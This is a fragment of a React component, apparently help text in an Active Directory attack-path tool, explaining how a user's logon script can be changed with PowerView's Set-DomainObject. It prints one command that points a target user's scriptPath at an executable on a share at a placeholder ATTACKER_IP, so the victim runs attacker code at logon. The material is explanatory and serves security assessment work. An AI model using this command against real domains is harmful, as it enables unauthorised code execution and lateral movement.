    ...
    return (
        <>
            <Typography variant='body2'>
                The logon script of a user can be changed using PowerView's Set-DomainObject.
            </Typography>
            <Typography variant='body2'>
            ...
            <Typography component={'pre'}>
                {
                    "Set-DomainObject -Credential $Cred -Identity \"TARGET_USER\" -Set @{'scriptPath'='\\\\ATTACKER_IP\\share\\run_at_logon.exe'}"
                }
            </Typography>
        </>
    );
